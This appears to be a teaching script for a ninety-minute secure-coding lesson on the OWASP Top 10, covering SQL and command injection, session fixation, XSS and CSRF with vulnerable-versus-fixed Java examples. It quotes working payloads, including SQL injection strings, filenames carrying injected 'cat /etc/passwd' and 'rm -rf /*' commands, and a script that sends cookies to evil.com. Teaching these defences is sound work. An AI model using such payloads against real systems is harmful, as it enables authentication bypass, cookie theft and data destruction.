# Day 29 — Spring Security & OWASP: Part 1 Walkthrough Script
## Secure Coding, OWASP Top 10, Injection, Broken Auth, XSS, CSRF

**Total time:** ~90 minutes  
**Files covered:** `01-owasp-and-secure-coding.md`, `02-injection-attacks.java`, `03-auth-xss-csrf-vulnerabilities.java`

---

## Segment 1 — Opening: Why Security is Different (8 min)

> "Good morning everyone. Today is about security — and I want to start with something you need to internalize as a developer: security is not a checkbox at the end of a project. It's not something you add in week 8 right before you deploy. Security is a discipline you practice every single time you write a line of code."

> "Here's the reality: the average time between a data breach occurring and a company detecting it is **277 days**. Almost nine months. By the time anyone notices, an attacker may have exfiltrated databases, stolen credentials, and set up persistent backdoors."

> "And the majority of these breaches don't require sophisticated nation-state attacks. They exploit the same basic mistakes we're going to talk about today — mistakes you have the power to prevent."

> "Open `01-owasp-and-secure-coding.md`. We're going to work through the concepts, then see real code examples."

---

## Segment 2 — Secure Coding Principles (8 min)

> "Scroll to the Core Principles table. These eight principles show up in security certifications, company policies, and interview questions. Let me walk through each one."

**Walk through the table:**

> "**Least Privilege.** Every component — every database user, every service account, every API key — should have only the permissions it needs. Nothing more. Your reporting service doesn't need to DELETE records. Your read-only API user doesn't need an ALTER TABLE privilege. If something gets compromised, the damage is contained."

> "**Defense in Depth.** Don't rely on a single control. Stack them. HTTPS AND input validation AND parameterized queries AND a web application firewall. An attacker who bypasses one layer still hits the next. Think of a medieval castle: moat, drawbridge, portcullis, inner walls, tower. Each layer slows the attacker down."

> "**Fail Securely.** When something goes wrong — an exception, a timeout, an unexpected condition — fail in the SECURE direction. If your authorization check throws a NullPointerException, don't accidentally allow the request through. Reject it."

> ⚠️ **Watch out:** "The classic failure is a try/catch that swallows the exception and returns true. I've seen this in production code: `try { checkPermission() } catch (Exception e) { return true; }` — that's catastrophic."

> "**Input Validation.** Never trust data from outside your system. Users, API clients, message queues — they can all send malicious data. Validate type, length, format, and allowed characters before using any input. We'll see the code for this shortly."

> "**Output Encoding.** Validate input AND encode output. When you put data from users into HTML, SQL, XML, shell commands — encode it for that context. We'll see how HTML escaping prevents XSS."

> "**Security by Default.** The secure option should be the default. You should have to explicitly opt IN to insecure behavior. Spring Security does this — all routes are denied by default. You explicitly permit what's needed."

---

## Segment 3 — OWASP Top 10 Overview (10 min)

> "Scroll down to the OWASP Top 10 section. OWASP stands for Open Web Application Security Project. They're a nonprofit foundation that publishes free security resources."

> "The OWASP Top 10 is updated every few years based on analysis of real-world breaches. These aren't theoretical — they're the actual categories of vulnerabilities that get exploited in production applications."

> "Let me call your attention to A01 — Broken Access Control. This is NUMBER ONE. The most common. Why? Because it's conceptually simple but easy to get wrong. Not checking whether a user is authorized to view a specific resource. Changing the URL from `/orders/1001` to `/orders/1002` and seeing someone else's order — that's IDOR, Insecure Direct Object Reference, and it's under Broken Access Control."

> **Ask the class:** "Has anyone here ever seen an app where changing the ID in the URL showed you someone else's data? It's more common than you'd think."

> "A02 — Cryptographic Failures — was previously called 'Sensitive Data Exposure'. Storing passwords with MD5. Sending credit card numbers over HTTP. Storing API keys in Git repos — which happens constantly, including at major companies."

> "A03 — Injection — used to be number one for a decade. It's still top 3. This is what we're going to spend the most time on today because the code examples are extremely clear."

> "A05 — Security Misconfiguration — this is the one that catches developers off guard. The classic: you deploy a Spring Boot app and forget that Actuator exposes `/actuator/env` which returns ALL your environment variables, including database passwords. I've seen this in production. Scroll down to that section and read it with me."

**Read through the Security Misconfiguration examples:**

> "Every one of these — default credentials, verbose errors, open debug endpoints — these are things an automated scanner can find in minutes. Attackers run these scanners constantly across the entire internet."

> "Look at the application.properties snippet. These are settings you should always check before deploying anything to production. If `spring.h2.console.enabled` is true in production — you've exposed a SQL query interface to anyone who finds it."

---

## Segment 4 — Injection Attacks: SQL Injection (20 min)

> "Now switch to `02-injection-attacks.java`. This is where we get concrete."

> "Injection is fundamentally about the interpreter not being able to tell the difference between DATA and COMMANDS. Your SQL engine receives a string and executes it. If an attacker can put SQL syntax into that string, they control the command."

**Point to `VulnerableBookRepository` — the VULNERABLE section:**

> "The comment at the top is important: ⚠️ THESE METHODS ARE INTENTIONALLY VULNERABLE. I want to be clear — this is what NOT to write."

> "Look at `findBooksByAuthor_VULNERABLE`. The query is built by concatenating the author parameter directly into a SQL string. Here's what that looks like with normal input and attack input."

**Walk through the examples:**

> "Normal input: `author = \"Robert Martin\"`. Query becomes: `SELECT title FROM books WHERE author = 'Robert Martin'`. Perfectly fine."

> "Attack input: `author = \"' OR '1'='1\"`. Let me trace through the concatenation. The string is: `author = '` + `' OR '1'='1` + `'`. So we get: `author = '' OR '1'='1'`. The WHERE condition is ALWAYS TRUE. The query returns every row in the books table."

> ⚠️ **Watch out:** "Students sometimes think: 'but that's just extra data — not harmful.' No. Look at the login example, `authenticateUser_VULNERABLE`. Attack input: `username = \"admin'--\"`. The `--` is a SQL comment. The generated query is: `WHERE username='admin'--' AND password='x'`. Everything after `--` is ignored. The password check is completely bypassed. The attacker is authenticated as admin without knowing the password."

> "And the UNION attack. By injecting a UNION SELECT, an attacker can append the contents of any table to the response. If users is an accessible table and passwords aren't hashed — complete credential theft."

> "Now scroll to `SecureBookRepository`. The fix is one word: **PreparedStatement**."

**Walk through `findBooksByAuthor_SECURE`:**

> "The SQL string uses `?` as a placeholder: `WHERE author = ?`. This SQL structure is sent to the database engine and compiled first. The structure is locked. Then separately, we call `pstmt.setString(1, author)` to bind the data."

> "The database receives them as two separate things: the compiled query template, and the data value. The engine knows: this is data, not SQL. Even if the data contains SQL syntax, it cannot alter the compiled query structure."

> "What happens with the attack input now? `author = \"' OR '1'='1\"`. The database treats it as: look for a book whose author is *literally the string* `' OR '1'='1`. No such author exists — zero results. Attack completely neutralized."

> **Ask the class:** "Why can't we parameterize the ORDER BY column in the same way?"

> "Because parameters can only represent DATA values — strings, numbers, dates. They cannot represent structural SQL elements like column names, table names, or keywords. PreparedStatement `?` will quote what you put there. `ORDER BY ?` with `title` becomes `ORDER BY 'title'` — which SQL interprets as ordering by a string literal, not a column name."

> "So for ORDER BY, we use a whitelist. Look at `findBooksOrderedBy_SECURE`. We check the field name against a list of known-good column names. Anything not on the list throws an exception. The whitelist approach is the right answer any time you can't parameterize."

**Point to the demo `main` method output:**

> "The demo at the bottom shows the neutralization in action. Let me trace through the output."

---

## Segment 5 — Command Injection (8 min)

> "Scroll down to Section 3 — Command Injection. Same principle, different interpreter. Instead of SQL, the interpreter is the operating system shell."

> "Look at `convertImage_VULNERABLE`. The intent is to convert a book cover image using ImageMagick. But the filename comes from user input and is concatenated into the command string. Then it's passed to `Runtime.exec(command)` — which by default invokes the shell."

> "Normal filename: `cover.png`. Command: `convert cover.png output.jpg`. Totally fine."

> "Attack filename: `cover.png; cat /etc/passwd > /var/www/passwd.txt`. The shell sees the semicolon and executes TWO commands: `convert cover.png` and then `cat /etc/passwd > /var/www/passwd.txt`. Your server just wrote its password file to a web-accessible location."

> "Look at `convertImage_SECURE`. Two fixes. First: `isValidImageFilename` validates with a regex whitelist — only alphanumeric characters, hyphens, underscores, dots, and known image extensions. The regex blocks all shell metacharacters."

> "Second: `ProcessBuilder` with an **array of strings** instead of a single shell command. When you pass a String array to ProcessBuilder, no shell is invoked. Each element is treated as a separate argument. The OS passes `cover.png; rm -rf /*` directly to ImageMagick as a filename. ImageMagick says 'file not found' and exits. The shell never interprets the semicolon."

> "The key insight: `Runtime.exec(String)` invokes shell. `ProcessBuilder(String[])` invokes the program directly."

---

## Segment 6 — Broken Authentication & Session Management (12 min)

> "Switch to `03-auth-xss-csrf-vulnerabilities.java`. Section 1."

> "Let's talk about broken authentication. This covers everything that can go wrong in how users prove who they are."

**Walk through the password hashing section:**

> "Start with password storage. Look at the comment near `hashPassword_VULNERABLE_MD5`. MD5 produces a 128-bit hash. Modern GPUs can compute 90 billion MD5 hashes per second. If an attacker steals a database of MD5-hashed passwords, they can try billions of passwords per second until they find matches."

> "There are also pre-computed tables called rainbow tables — maps of known passwords to their hashes. If you don't salt (add unique random data per password), two users with the same password have identical hashes. One crack reveals both."

> "Look at `demonstrateBcryptConcept`. BCrypt outputs a 60-character string that encodes the algorithm version, cost factor, salt, AND hash all together. The salt is different every time, so identical passwords produce different hashes. And BCrypt is designed to be SLOW — 250ms per check at cost=12. An attacker can only try a few passwords per second instead of billions."

> ⚠️ **Watch out:** "SHA-256 without salt is still fast — don't use it for passwords. bcrypt, scrypt, and Argon2 are the only acceptable password hashing algorithms. Spring Security's BCryptPasswordEncoder handles all of this for you."

**Walk through account lockout:**

> "Now look at `isAccountLocked` and `recordFailedAttempt`. This is an implementation of account lockout. After 5 failures, the account is locked for 15 minutes. In production, you'd store this in Redis or the database so it survives server restarts and works across multiple app instances."

> "Notice that `recordFailedAttempts` uses `merge()` to increment the counter atomically. In a concurrent environment, you don't want two threads both reading 4, both writing 5, and the account never actually locking."

**Walk through session fixation:**

> "Scroll to `login_VULNERABLE` and `login_SECURE`. This is the session fixation vulnerability."

> "The attack: attacker visits your login page, gets a session ID — even as an unauthenticated user, the server gives you a session. Attacker tricks the victim into visiting with that session ID. Victim logs in. Now the attacker knows the victim's session ID and uses it to make authenticated requests."

> "The fix is one line: `oldSession.invalidate()`. Always destroy the pre-login session and create a fresh one at the moment of successful authentication. Spring Security does this automatically — but it's important you understand WHY."

> "And look at `demonstrateSessionConfig`. Three cookie flags you always want: `HttpOnly` — JavaScript cannot read the cookie, so XSS can't steal it. `Secure` — cookie only travels over HTTPS. `SameSite=Strict` — browser won't send the cookie on cross-origin requests, which defeats CSRF."

---

## Segment 7 — XSS: Cross-Site Scripting (12 min)

> "Section 2 — XSS. This is one of the most common vulnerabilities on the web. Let me give you the mental model first."

> "Your application has user content — reviews, comments, usernames, search terms. That content gets embedded into HTML pages. If you insert it without escaping, the browser interprets it as HTML and JavaScript, not as text. An attacker who controls what's embedded can make your page run their script."

**Walk through stored XSS:**

> "Look at `renderReview_VULNERABLE`. A customer writes a book review. The review is stored in the database. Every time someone visits the book page, the review is rendered in the HTML. Normal review: great."

> "Attacker review: `<script>document.location='https://evil.com?c='+document.cookie</script>`. That gets stored. Now EVERY visitor who loads the book page executes that script. The script reads `document.cookie` — which includes the session cookie — and sends it to the attacker's server. The attacker now has your session cookie and can impersonate you."

> "This is why Stored XSS is the worst kind — one attack affects every future visitor."

> "Now look at `renderReview_SECURE`. We add one call: `HtmlUtils.htmlEscape(reviewText)`. This converts `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`. The browser renders these as the literal characters they represent — it displays `<script>` as visible text, never executes it as code."

> **Ask the class:** "What's the output if the attacker input is `<script>alert(1)</script>`?"

> "After `htmlEscape`: `&lt;script&gt;alert(1)&lt;/script&gt;`. The browser shows: `<script>alert(1)</script>` as text on the screen. No JavaScript runs."

**Walk through reflected XSS:**

> "Reflected XSS is in a URL. The attacker crafts a link like `/search?q=<img src=x onerror=alert(document.cookie)>` and tricks the victim into clicking it — in an email, a phishing page, a malicious ad. The server reflects the search term back in the page without escaping. The img tag loads, fails, fires onerror, script executes."

> "Fix: same as stored XSS. Always HTML-escape any user-supplied data before including it in the HTML response."

**Point to DOM-based XSS comments:**

> "DOM-based XSS is sneaky because the server sends clean HTML — the vulnerability is entirely in the JavaScript. The classic pattern: read from `location.hash` and write to `innerHTML`. Use `textContent` instead of `innerHTML` when displaying user-provided data in JavaScript."

---

## Segment 8 — CSRF: Cross-Site Request Forgery (12 min)

> "Section 3 — CSRF. Read the attack flow comment block at the top of `CsrfSecurity`."

**Walk through the attack flow slowly:**

> "Alice is logged into bankapp.com. Her browser has a session cookie. Cookies are automatically attached to every request to that domain — that's how cookies work. Then Alice visits evil.com, which has a hidden form that submits to bankapp.com with a transfer action. The browser submits the form. The browser automatically includes Alice's bankapp.com cookie. bankapp.com sees a valid session — it thinks Alice did this intentionally. Transfer happens."

> "Alice never clicked anything intentionally. The attack is entirely in how browsers work."

> ⚠️ **Watch out:** "Students sometimes confuse CSRF and XSS. XSS is about injecting scripts into YOUR site. CSRF is about a DIFFERENT site making requests TO your site using the victim's credentials. They're distinct attacks with different defenses."

**Walk through CSRF token generation and validation:**

> "The standard defense is the synchronizer token pattern. The server generates a secret, random token tied to the user's session. This token is embedded in every HTML form as a hidden field. On every POST/PUT/DELETE, the server checks that the token is present and matches the session."

> "Look at `generateCsrfToken`. We use `SecureRandom` — NOT `Math.random()` — to generate 32 bytes of entropy. Base64-encoded, that's 43 unpredictable characters. An attacker at evil.com cannot read your session page — cross-origin JavaScript is blocked by the browser's Same-Origin Policy. So they cannot guess or retrieve the token."

> "Look at `validateCsrfToken`. Notice: `MessageDigest.isEqual` instead of `String.equals`. This is a timing attack prevention. `String.equals` returns false as soon as it finds the first character mismatch — an attacker can measure response times to guess the token one character at a time. `MessageDigest.isEqual` always compares the full length."

> "Look at the Thymeleaf form example. When Spring Security is configured and you use Thymeleaf's `th:action`, Thymeleaf automatically injects the `_csrf` hidden field. You don't have to write that code yourself. For AJAX, you read the token from a meta tag and set `X-CSRF-TOKEN` header."

> "Finally, look at `demonstrateCsrfDecision`. This is important for REST API development. CSRF only attacks work when the browser automatically sends credentials. With JWT Bearer tokens in Authorization headers — the browser does NOT automatically attach those to cross-origin requests. So stateless JWT APIs are not vulnerable to CSRF and can safely disable it. Session-based apps MUST keep CSRF on."

---

## Segment 9 — Wrap-Up & Interview Questions (5 min)

> "Let's do a quick recap of Part 1:
> - Secure coding principles: Least Privilege, Defense in Depth, Fail Securely, Input Validation, Output Encoding, Security by Default
> - OWASP Top 10: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A05 Misconfiguration, A07 Auth Failures
> - SQL Injection: always use PreparedStatement — NEVER concatenate user input into SQL
> - Command Injection: use ProcessBuilder with String arrays — avoid invoking the shell
> - Broken Auth: bcrypt passwords, account lockout, invalidate session on login
> - XSS: HTML-encode output, textContent vs innerHTML, Content-Security-Policy
> - CSRF: synchronizer token, SameSite cookie, safe to disable for JWT APIs"

**Interview questions:**

> 1. "What is SQL injection and how do you prevent it?" *(Never concatenate user input; always use PreparedStatement)*
> 2. "What's the difference between XSS and CSRF?" *(XSS = inject script into your site; CSRF = another site makes requests using your credentials)*
> 3. "Why is bcrypt better than SHA-256 for password hashing?" *(Designed to be slow, built-in salt, work factor, brute-force resistant)*
> 4. "What is a CSRF token and how does it work?" *(Random server-generated secret in every form; attacker can't read it from another origin)*
> 5. "When can you safely disable CSRF protection in Spring Security?" *(Stateless REST API using JWT Bearer tokens — no cookie session)*

> "Great. Now let's talk about how Spring Security actually implements all of these protections for you."

---

## Timing Reference

| Segment | Topic | Time |
|---------|-------|------|
| 1 | Opening: why security matters | 8 min |
| 2 | Secure coding principles | 8 min |
| 3 | OWASP Top 10 overview | 10 min |
| 4 | SQL Injection (vulnerable vs secure) | 20 min |
| 5 | Command Injection | 8 min |
| 6 | Broken Auth & Session Management | 12 min |
| 7 | XSS (stored, reflected, DOM) | 12 min |
| 8 | CSRF (attack flow, token, SameSite) | 12 min |
| 9 | Wrap-up + interview questions | 5 min |
| **Total** | | **~95 min** |
